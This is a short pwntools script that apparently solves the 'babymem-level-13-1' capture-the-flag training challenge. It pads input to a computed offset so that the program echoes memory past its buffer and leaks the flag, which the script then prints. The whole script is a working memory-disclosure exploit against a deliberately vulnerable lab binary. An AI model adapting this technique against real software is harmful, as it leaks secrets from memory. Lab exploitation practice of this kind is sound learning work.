from pwn import *

context.arch = "amd64"

elf = ELF("/challenge/babymem-level-13-1")

buff_distance = 336
flag_distance = 270
PADDING = buff_distance - flag_distance

PAYLOAD = 'A'*(PADDING) + "B"
io = elf.process()
io.sendline(f"{len(PAYLOAD)}")
io.send(PAYLOAD)
io.recvuntil("AAAAAAAB")
flag = io.recvuntil("\n")
print(flag)
io.recvall()